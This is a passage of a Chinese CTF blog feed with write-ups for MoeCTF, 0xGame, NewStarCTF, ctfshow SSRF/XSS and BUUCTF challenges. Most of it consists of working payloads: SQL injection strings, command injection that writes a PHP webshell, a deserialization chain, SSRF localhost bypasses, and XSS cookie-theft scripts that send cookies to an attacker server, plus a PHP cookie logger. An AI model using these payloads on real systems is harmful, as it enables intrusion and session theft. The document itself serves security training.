gethash(*items):    c = 0    for item in items:        if item is None:            continue        c ^= int.from_bytes(hashlib.md5(f&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?    return hex(c)[2:]</code></pre><p>hashed就是将我们传入的username和password进行异或</p><pre><code>for k,v in hashed_users.items()hashed_users = dict((k,gethash(k,v)) for k,v in users.items())assert &quot;admin&quot; in usersassert users[&quot;admin&quot;] == &quot;admin&quot;</code></pre><p>这里，hashed_users就是{“admin”，0}，所以最后k就是“admin”，v就是0</p><p>最后也就是让hashed&#x3D;&#x3D;0，而我们前面知道，hashed就是将我们传入的username和password进行异或，所以只有username&#x3D;&#x3D;password时hashed才是0，而python代码又限制<code>username</code>和<code>password</code>不能相等</p><p>这里我们就要利用字符和数字进行绕过，例如我们传入<code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:1&#125; </code>，二者类型不同所以不相等，但进行加盐哈希处理时会把数字当作字符串来处理，因此二者的<code>gethash</code>值为0，从而满足题目条件</p><img src="/2023/10/04/Moectf-2023/205615.png" class=""><p>题目对传入的数据进行了五次base64解码，所以我们就将<code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:1&#125;</code>加密五次后传入即可获得flag</p><h3 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h3><p>在源代码中发现一个wp-content&#x2F;plugins&#x2F;visitor-logging&#x2F;logger.php</p><img src="/2023/10/04/Moectf-2023/212200.png" class=""><p>可以直接sqlmap跑</p><p>测试了一下<code>insert into table_name (列1, 列2,...) VALUES (值1, 值2,....)</code> 这个语句要拼接代码好像只能在VALUES中的最后一个参数位置进行拼接</p><p>爆数据库名：</p><pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,(select database())),0x7e)//wordpress</code></pre><p>爆表名：</p><pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;wordpress&#39;)),0x7e)//secret_of_kokomi,visitor_record</code></pre><p>爆列名：</p><pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#39;secret_of_kokomi&#39;)),0x7e)//content,id</code></pre><p>爆数据（因为报错注入有字符长度限制，所以这里要用right进行切割）：</p><pre><code>ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,right((select group_concat(content)from secret_of_kokomi),30)),0x7e)//ve2y_C0de_3nd_Poss1bIlIti3s!!&#125;ip=34&amp;user_agent=fd&amp;time=123 and updatexml(1,concat(0x7e,right((select group_concat(content)from secret_of_kokomi),50)),0x7e)//moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Moectf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame-2023</title>
      <link href="/2023/10/02/0xGame-2023/"/>
      <url>/2023/10/02/0xGame-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>这道题是信息搜集，打开题目后查看源代码，有个<code>assets/index-33309f51.js</code>，打开后在页面最底部可发现一个<code>sourceMappingURL=index-33309f51.js.map</code>,猜测可能是sourcemap文件泄露</p><p>将url栏中的<code>index-33309f51.js</code>用<code>index-33309f51.js.map</code>替换，即可下载文件</p><p>然后用reverse-sourcemap工具还原文件</p><pre><code>reverse-sourcemap -v index-33309f51.js.map -o output</code></pre><img src="/2023/10/02/0xGame-2023/185016.png" class=""><p>最后找了半天在src&#x2F;main.js里面找到了flag</p><h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p>这道题就是改请求包的数据</p><img src="/2023/10/02/0xGame-2023/194458.png" class=""><h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><img src="/2023/10/02/0xGame-2023/194707.png" class=""><p>这道题原本思考了一下用c&#x3D;1024e2fff绕过，结果在本地可以，在靶场里就是不行，后面发现靶场用的是php7.4.27</p><p>所以这道题最后用c&#x3D;1024.2fff成功绕过</p><p>究其原因就是大概php7.0.9以上intval函数会自动识别字符串中的科学计数法</p><p>总结一下intval常见的绕过思路：</p><p><strong>int intval( $var, $base )</strong></p><p>base参数可选</p><p>当var为整形数字时，函数自动识别var使用的进制</p><p>当var为字符串时，将base设置为0后可自动识别var使用的进制</p><pre><code>绕过思路：1、进制自动转换2、数组绕过3、转换小数4、字符串整形转换（0x，0b,e）(php7.0以上已经可以识别科学计数法e)5、取反~ (当某个数字被过滤时，可以两次取反来绕过:intval(~~10)==intval(10))6、算数运算符（如果传入的 $var参数（只支持整形，不支持字符串）包含算数运算符，会先运算，再对运算结果进行转换）7、浮点数精度丢失问题（intval(0.58*100.0)==57）</code></pre><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>这道题就是命令执行</p><p>抓包然后用连接符执行命令</p><pre><code>（1）; //分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。（2）|| //逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。（3）&amp;&amp; //逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</code></pre><p>但是测试时发现&#x2F;和空格被ban了，空格可以用%09绕过，&#x2F;不能用没法跳转目录</p><p>第二种方法就是写文件</p><pre><code>127.0.0.1&amp;echo%09&quot;&lt;?php%09eval(&quot;ls&quot;);&quot;%09&gt;hhh.php</code></pre><p>但是进入文件后发现报错，测试了一下发现<code>;</code>也被ban了</p><p>后面才知道还有一种方法，用base64编码</p><p>先将<code>&lt;?php eval(&quot;ls&quot;);</code>base64编码为PD9waHAlMDlldmFsKCJscyIpOw&#x3D;&#x3D;（注意编码后的字符串不能有加号，加号会被url解码为空格然后再ban掉）</p><p>然后再使用管道连接符base64解码命令</p><pre><code>127.0.0.1&amp;echo%09&quot;PD9waHAlMDlldmFsKCJscyIpOw==&quot;|base64%09-d%09&gt;hhh.php</code></pre><pre><code>| 管道连接符，使用此管道符“|”可以将两个命令分隔开，“|”左边命令的输出就会作为“|”右边命令的输入，此命令可连续使用</code></pre><p>后面发现这道题还可以看api.php的源码</p><h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>这道题要拿githacker跑</p><p>githacker –url <a href="http://120.27.148.152:50013/.git/">http://120.27.148.152:50013/.git/</a> –output-folder result</p><p>进入目录后查看历史版本 </p><pre><code>git log --reflog</code></pre><img src="/2023/10/02/0xGame-2023/200429.png" class=""><p>切换到有flag的版本</p><pre><code>git reset --hard 8a5b670558921bd232d75b29542492f00698298b</code></pre><p>在当前目录匹配包含flag的文件</p><pre><code>grep -r  &quot;flag&quot; ./</code></pre><img src="/2023/10/02/0xGame-2023/201628.png" class=""><h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h3 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h3><p>这道题给了源码，看了一下是二次渲染，那么最简单的方法就是上传一个能绕过二次渲染的gif</p><p>一般要通过文件包含才能rce，但这道题没有文件包含，后面才发现这道题判断文件类型的时候是判断的MIME，也就是只需修改Content-Type为image&#x2F;gif，文件后缀改为php</p><img src="/2023/10/02/0xGame-2023/184321.png" class=""><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p>php反序列化</p><p>直接上payload</p><pre><code>&lt;?phphighlight_file(__FILE__);class Cache &#123;    public $key;    public $expired;    public $helper;    public function __wakeup() &#123;        $this-&gt;expired = False;    &#125;    public function expired() &#123;        if ($this-&gt;expired) &#123;            $this-&gt;helper-&gt;clean($this-&gt;key);            return True;        &#125; else &#123;            return False;        &#125;    &#125;&#125;class Storage &#123;    public $store;    public function __set($name, $value) &#123;        if (!$this-&gt;store) &#123;            $this-&gt;store = array();        &#125;        if (!$value-&gt;expired()) &#123;            $this-&gt;store[$name] = $value;        &#125;    &#125;    public function __get($name) &#123;        return $this-&gt;data[$name];    &#125;&#125;class Helper &#123;    public $funcs;    public function __call($name, $args) &#123;        $this-&gt;funcs[$name](...$args);    &#125;&#125;class DataObject &#123;    public $storage;    public $data;    public function __destruct() &#123;        foreach ($this-&gt;data as $key =&gt; $value) &#123;            $this-&gt;storage-&gt;$key = $value;        &#125;    &#125;&#125;$a=new Storage();$b=new Helper();$b-&gt;funcs=array(&quot;clean&quot;=&gt;&quot;phpinfo&quot;);$c=new Cache();$c-&gt;expired=True;$c-&gt;helper=$b;$c-&gt;key=-1;$d=new DataObject();$d-&gt;storage=$a;$d-&gt;data=array(&quot;data&quot;=&gt;$c);echo serialize($d);//?u=O:10:&quot;DataObject&quot;:3:&#123;s:7:&quot;storage&quot;;O:7:&quot;Storage&quot;:1:&#123;s:5:&quot;store&quot;;N;&#125;s:4:&quot;data&quot;;a:1:&#123;s:4:&quot;data&quot;;O:5:&quot;Cache&quot;:3:&#123;s:3:&quot;key&quot;;i:-1;s:7:&quot;expired&quot;;b:1;s:6:&quot;helper&quot;;O:6:&quot;Helper&quot;:1:&#123;s:5:&quot;funcs&quot;;a:1:&#123;s:5:&quot;clean&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;&#125;&#125;</code></pre><p>这道题要设置属性个数比实际属性个数多绕过__wakeup()，在测试的时候，发现修改DataObject或Cache的属性个数都可以</p><h3 id="ez-sqli"><a href="#ez-sqli" class="headerlink" title="ez_sqli"></a>ez_sqli</h3><p>根据提示，这道题要用堆叠注入，并且堆叠注入在前面语句有回显的情况下没法回显</p><p>所以要配合报错注入或盲注，并且源码中屏蔽了很多关键词，所以用使用预处理语句</p><p>通过测试，发现空格也被屏蔽了，可以用&#x2F;**&#x2F;绕过</p><pre><code>id;sEt@a=concat(&quot;sel&quot;,&quot;ect/**/&quot;,&quot;extractvalue(1,concat(0x7e,(&quot;,&quot;sel&quot;,&quot;ect/**/&quot;,&quot;flag/**/&quot;,&quot;from/**/&quot;,&quot;flag/**/limit/**/&quot;,&quot;0,1)))&quot;);PRepare/**/hello/**/from/**/@a;execute/**/hello;</code></pre><p>也可以直接用char函数来拼接ascii：</p><pre><code>m=&quot;select extractvalue(1,concat(0x7e,(select flag from flag limit 0,1)))&quot;char=&quot;&quot;for i in range(0,len(m)):    char+=&quot;char(&quot;+str(ord(m[i]))+&quot;),&quot;print(char)</code></pre><p>payload</p><pre><code>id;set@sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(101),char(120),char(116),char(114),char(97),char(99),char(116),char(118),char(97),char(108),char(117),char(101),char(40),char(49),char(44),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(48),char(120),char(55),char(101),char(44),char(40),char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(102),char(108),char(97),char(103),char(32),char(108),char(105),char(109),char(105),char(116),char(32),char(48),char(44),char(49),char(41),char(41),char(41));prepare/**/s1/**/from/**/@sql;execute/**/s1;</code></pre><img src="/2023/10/02/0xGame-2023/132036.png" class=""><p>没显示完全，用right</p><pre><code>select extractvalue(1,concat(0x7e,right((select flag from flag limit 0,1),30)))</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF_2023</title>
      <link href="/2023/09/26/NewStarCTF-2023/"/>
      <url>/2023/09/26/NewStarCTF-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h4><p>题目提示泄露了一些敏感信息在Web根目录下</p><p>打开后猜测备份压缩文件名，这题的是<a href="http://www.zip/">www.zip</a></p><p>下载后flag在robots.txt和index.php文件里，拼接起来即可</p><p>常见备份文件后缀：</p><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><h4 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h4><p>这道题直接上传一句话木马文件即可，没有过滤</p><h4 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h4><img src="/2023/09/26/NewStarCTF-2023/211036.png" class=""><p>直接抓包：</p><img src="/2023/09/26/NewStarCTF-2023/211329.png" class=""><p>先是让给ctf用get方式传参，随便传一个</p><p>然后给secret用post方式从传参，传源代码中隐藏的一个值，要进行base64解码后再传（注意burp发包的时候哟要将请求头改为POST）</p><p>第三步将power的值改为ctfer</p><p>第四步将User-Agent的值改为NewStarCTF2023</p><p>第五步添加一个请求首部Referer: newstarctf.com</p><p>最后一步构造一个伪造ip首部 X-Real-IP: 127.0.0.1（试了一下只有这个可以）</p><pre><code>Origin 指示了请求来自于哪个站点，只有服务器名，不包含路径信息Referer 指示了请求来自于哪个具体页面，包含服务器名和路径的详细URLX-Forwarded-For是告诉服务器当前请求者的最终ip</code></pre><p>常见的可替换X-Forwarded-For的首部：</p><pre><code>X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Client-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded: 127.0.0.1True-Client-Ip: 127.0.0.1Proxy-Client-IP: 127.0.0.1</code></pre><h4 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h4><p>这关实际和Flask模板注入没关系，传入number1和number2即可再页面中找出flag</p><h4 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h4><img src="/2023/09/26/NewStarCTF-2023/214505.png" class=""><p>这题有五个关卡：</p><p>1、if($_GET[‘key1’] !&#x3D;&#x3D; $_GET[‘key2’] &amp;&amp; md5($_GET[‘key1’]) &#x3D;&#x3D; md5($_GET[‘key2’]))</p><p>很常见，直接用数组绕过</p><p>key1[]&#x3D;1&amp;key2[]&#x3D;3</p><p>2、if(md5($_POST[‘key3’]) &#x3D;&#x3D;&#x3D; sha1($_POST[‘key3’]))</p><p>还是直接用数组绕过</p><p>key3[]&#x3D;3</p><p>3、if(strcmp($_GET[‘key4’],file_get_contents(“&#x2F;flag”)) &#x3D;&#x3D; 0)</p><p>4、if(!is_numeric($_GET[‘key5’]) &amp;&amp; $_GET[‘key5’] &gt; 2023)</p><p>这里传key5&#x3D;2024abc就可以了</p><p>5、第五个关卡里<strong>extract</strong>函数的功能是从数组中将变量导入到当前的符号表，简单的说就是将数组的键名转换为变量名，将数组的值转换为变量的值</p><p>直接传个flag5&#x3D;*就可以</p><h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h4><img src="/2023/09/26/NewStarCTF-2023/220811.png" class=""><p>题目的意思是让你找到一个字符串，经过md5加密后的字符串前6位是c4d038</p><p>这里就只能写个脚本跑一下</p><pre><code>import hashlibdic=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;flag=&quot;c4d038&quot;def md5():    for a in dic:        for b in dic:            for c in dic:                for d in dic:                    for e in dic:                        t=str(a+b+c+d+e)                        md5=hashlib.md5(t.encode(&#39;utf-8&#39;)).hexdigest()                        if(md5[0:6]==flag):                            print(t)                            returnmd5()</code></pre><p>跑出一个04p9l</p><p>然后命令执行过滤了一些命令，但问题不大</p><p>用&#96;&#96;替代system函数，用f’l’ag绕过flag</p><pre><code>payload password=04p9l&amp;e[v.a.l=echo `c&#39;a&#39;t /f&#39;l&#39;ag`;</code></pre><p>官方题解：</p><pre><code>POST:e[v.a.l=var_dump(file_get_contents($_GET[&#39;a&#39;]));\GET:a=/flag</code></pre><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>看了一下官方题解</p><p>进入之后是一个登录界面，先随便注册一个账号登进去看看。</p><p>进入之后是一个登录界面，先随便注册一个账号登进去看看。</p><p><code>Ctrl</code>+<code>D</code>回到 Shell，简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询Bash历史记录。</p><img src="/2023/09/26/NewStarCTF-2023/180143.png" class=""><p>发现 Hint，第一句意思是将“newstar”和“newstar2023”这两个密码加入弱密码文件，第二句意思是将将密码设为密码文件中的任意一个。</p><p>得知 admin 的密码为弱密码加上<code>newstar newstar2023</code>后其中的一个。</p><p>按<code>CtrlD</code>或者输入<code>exit</code>后回车回到登录界面。</p><p>试一下<code>newstar``newstar2023</code>，没登进去，在网上随便搜弱密码，试一些常见的，试出来是<code>000000</code>，不同的靶机密码可能不一样。</p><p>题目采用的弱密码表</p><pre><code>123456789passwordnewstarnewstar2023123qweqwe123qwertyuiopasdfghjklzxcvbnmadmin123admin888111111000000</code></pre><p>查询历史记录只提示了使用<code>BurpSuite</code>，尝试抓包。</p><img src="/2023/09/26/NewStarCTF-2023/180953.png" class=""><p>使用<code>BurpSuite</code>拦截、开启代理，重新完成一次登录，发现一个<code>/passport</code>的 302 跳转，查看它的响应获取 flag.</p><img src="/2023/09/26/NewStarCTF-2023/184505.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf(ctfshow)</title>
      <link href="/2023/08/23/ssrf(ctfshow)/"/>
      <url>/2023/08/23/ssrf(ctfshow)/</url>
      
        <content type="html"><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#39;url&#39;];$ch=curl_init($url);//初始化 cURL 会话curl_setopt($ch, CURLOPT_HEADER, 0);//启用时会将头文件的信息作为数据流输出。curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。$result=curl_exec($ch);//执行 cURL 会话curl_close($ch);//关闭 cURL 会话echo ($result);?&gt;</code></pre><p>payload: url&#x3D;127.0.0.1&#x2F;flag.php</p><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><p>parse_url()函数会解析url并返回关联数组</p><pre><code>$url = &#39;http://username:password@hostname:9090/path?arg=value#anchor&#39;;var_dump(parse_url($url));array(8) &#123;  [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot;  [&quot;host&quot;]=&gt;  string(8) &quot;hostname&quot;  [&quot;port&quot;]=&gt;  int(9090)  [&quot;user&quot;]=&gt;  string(8) &quot;username&quot;  [&quot;pass&quot;]=&gt;  string(8) &quot;password&quot;  [&quot;path&quot;]=&gt;  string(5) &quot;/path&quot;  [&quot;query&quot;]=&gt;  string(9) &quot;arg=value&quot;  [&quot;fragment&quot;]=&gt;  string(6) &quot;anchor&quot;&#125;</code></pre><p>这关看似使用了正则匹配preg_match，但缺少参数，没啥用</p><pre><code>url=http://127.0.0.1/flag.phpurl=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://0x7f.0.0.1/flag.php     //16进制url=http://0177.0.0.1/flag.php   //8进制url=http://2130706433/flag.php     //10进制整数格式url=http://0x7F000001/flag.php     //16进制整数格式url=http://127.0.1/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>直接绕过</p><pre><code>url=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><p>这题把0和1都屏蔽了</p><p>http(s):<em>&#x2F;&#x2F;sudo.cc&#x2F;指向127.0.0.1</em></p><pre><code>url=http://sudo.cc/flag.php</code></pre><p>也可以用自己的域名，让他解析到127.0.0.1来用</p><pre><code>&lt;?php header(&quot;Location: http://127.0.0.1/flag.php&quot;);# POST: url=http://your-domain/ssrf.php</code></pre><h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><p>多了一个限制让host位数小于5</p><pre><code>url=http://0/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><p>限制host位数小于3</p><pre><code>url=http://0/flag.php</code></pre><h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><p>利用302跳转和dns重绑定都可以。</p><pre><code>&lt;?phpheader(&quot;Location:http://127.0.0.1/flag.php&quot;); </code></pre><p>然后payload写自己的这个地址就可以了。<br>payload:<a href="http://xxx/a.php">http://xxx/a.php</a></p><p>2、在这个网站注册一个账号<code>http://ceye.io/</code>，然后会给你分配一个域名，修改成如下的内容，第一个随便填，第二个写127.0.0.1</p><img src="/2023/08/23/ssrf(ctfshow)/132206.png" class=""><p>多试几次就可以</p><h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><p>url必须以<code>http://ctf.</code>开头，必须以show结尾。<br>以show结尾比较好办，要么#show，要么?a&#x3D;show这样的都可以。<br>以<code>http://ctf.</code>开头的话，加上一个@127.0.0.1就可以绕过了，这样parse_url解析出来的host是127.0.0.1，考虑到<code>ftp://user[:pass]@ip[:port]/path</code>，因此前面的ctf.会被解析成user。</p><pre><code>url=http://ctf.@127.0.0.1/flag.php#show</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss(ctfshow)</title>
      <link href="/2023/08/16/xss(ctfshow)/"/>
      <url>/2023/08/16/xss(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h3><p>这关没有过滤，但有bot拦截，如果我们直接用</p><pre><code>&lt;script&gt;var x=document.cookie;alert(x);&lt;/script&gt;</code></pre><p>会发现弹出you are not admin，所以我们只能将数据外带</p><p>方式1：xss平台</p><pre><code>https://xsshs.cn/，https://hk.sb/,https://xss.pt/，http://xsscom.com https://xs.sb </code></pre><p>在xss平台创建项目，选择默认模块即可，复制生成的xss代码，复制到题目留言框中，刷新下页面，然后在平台查看项目</p><img src="/2023/08/16/xss(ctfshow)/165449.png" class=""><p>方式二：vps</p><p>服务器可以起nc，可以用python起一个临时的服务器，也可以直接通过php自动接收脚本：</p><p>在自己的服务器上放一个php代码：</p><pre><code>&lt;?php$cookie = $_GET[&#39;cookie&#39;];$log = fopen(&quot;cookie.txt&quot;, &quot;a&quot;);fwrite($log, $cookie . &quot;\n&quot;);fclose($log);?&gt;</code></pre><p>收集一下可用的姿势：</p><pre><code>&lt;script&gt;var x=document.createElement(&quot;img&quot;); x.src=&quot;http://xxx/fff.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code></pre><pre><code>&lt;script&gt;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&lt;/script&gt;</code></pre><pre><code>&lt;script&gt;window.location.href=http://xxx/fff.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></pre><pre><code>&lt;script&gt;document.location.href=http://xxx/fff.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></pre><pre><code>&lt;script&gt;location.href=&#39;http://xxx/fff.php?cookie=&#39;+document.cookie&lt;/script&gt;</code></pre><pre><code>&lt;input onfocus=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot; autofocus&gt;</code></pre><pre><code>&lt;svg onload=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot;&gt;</code></pre><pre><code>&lt;iframe onload=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></pre><pre><code>&lt;body onload=&quot;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.cookie)&quot;&gt;</code></pre><p>更多姿势可以参考：<a href="https://www.freebuf.com/articles/web/340080.html">https://www.freebuf.com/articles/web/340080.html</a></p><h3 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h3><p>应该是过滤了script，还有很多标签都可以用</p><h3 id="web318-319"><a href="#web318-319" class="headerlink" title="web318~319"></a>web318~319</h3><p>过滤了img</p><h3 id="web320-321"><a href="#web320-321" class="headerlink" title="web320~321"></a>web320~321</h3><p>过滤空格，可以用%09、tab、&#x2F;、&#x2F;**&#x2F;来绕过</p><pre><code>&lt;svg/onload=&quot;window.open(&#39;http://47.113.199.107/fff.php?cookie=&#39;+document.cookie)&quot;&gt;</code></pre><h3 id="web322-326"><a href="#web322-326" class="headerlink" title="web322~326"></a>web322~326</h3><p>过滤iframe，xss，空格，分号，逗号</p><h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>存储型xss</p><p>界面变成了这样</p><img src="/2023/08/16/xss(ctfshow)/192459.png" class=""><p>一点就是收件人必须是admin才能发送成功，然后发件人和信的内容都填payload即可</p><h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><p>在用户管理处显示要 <code>admin</code> 权限，且显示会显示所有的用户名密码，说明所有的用户名密码会存储在某个地方，而这个地方就会触发xss</p><p>这一关就是要通过xss获取到管理员的cookie</p><p>有两种方法</p><p>1、在自己的服务器上放一个php文件和js文件</p><p>js-被加载到管理员页面</p><pre><code>var img = new Image();img.src = &quot;http://your-domain/cookie.php?cookie=&quot;+document.cookie;document.body.append(img);</code></pre><p>php就是和前面一样，接收js传来的cookie并保存</p><p>注册处填入：</p><pre><code>&lt;script src=http://your-domain/test.js&gt;&lt;/script&gt;</code></pre><p>2、将cookie直接打到php</p><pre><code>&lt;script&gt;location.href=&#39;http://ip/x.php?cookie=&#39;+document.cookie&lt;/script&gt;//这里不能用body标签，可以用script标签</code></pre><p>接收到cookie：</p><p>然后burp抓管理员页面的包，修改cookie</p><img src="/2023/08/16/xss(ctfshow)/205158.png" class=""><p>然后一个一个放包，改cookie</p><img src="/2023/08/16/xss(ctfshow)/205349.png" class=""><p>拿到flag:</p><img src="/2023/08/16/xss(ctfshow)/205404.png" class=""><pre><code>因为页面框架获取和数据拉取填充是异步进行的，不在同一个数据包中，如果通过BURP完成此题，请注意数据包是否为获取指定数据。</code></pre><p>或者可以直接在浏览器改一次cookie就行了</p><h3 id="web-329"><a href="#web-329" class="headerlink" title="web 329"></a>web 329</h3><p>cookie设置了有效期，拿到cookie时就已经失效了，需要换个思路，既然可以通过运行js脚本拿到cookie，也可以拿到用户管理页面的内容，把flag带出来</p><pre><code>&lt;script&gt;window.open(&#39;http://xxx/fff.php?cookie=&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf</title>
      <link href="/2023/08/03/buuctf/"/>
      <url>/2023/08/03/buuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h3><p>这道题测出来是单引号闭合，也没有上面过滤，直接用万能密码就能爆出flag</p><pre><code>payload ?username=admin&#39; or 1=1-- -&amp;password=admin</code></pre><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>对查询点进行fuzz测试发现很多关键字都被过滤了</p><img src="/2023/08/03/buuctf/222647.png" class=""><p>回包长度为500的都是可以正常使用的，这里;没有被过滤，尝试堆叠注入</p><p>首先show tables;</p><img src="/2023/08/03/buuctf/224429.png" class=""><p>然后show columns from Flag;，不行，被过滤了。</p><p>参考别人wp <a href="https://blog.csdn.net/StevenOnesir/article/details/110203051%EF%BC%8C%E6%9C%89%E4%B8%A4%E7%A7%8D%E8%A7%A3%E6%B3%95">https://blog.csdn.net/StevenOnesir/article/details/110203051，有两种解法</a></p><p>解法1：</p><p>输入数字只回显1，输入字母啥也不回显，那么我们应该推出后端代码有 或 结构，而且不直接回显flag，但作为一道题目，from应该是from flag，所以猜测后端代码为：</p><pre><code>select $_POST[&#39;query&#39;] || flag from flag</code></pre><p>所以payload就变的简单：</p><pre><code>*，1</code></pre><p>这里，我们的语句变成了</p><pre><code>select *，1 from flag</code></pre><p>select 1 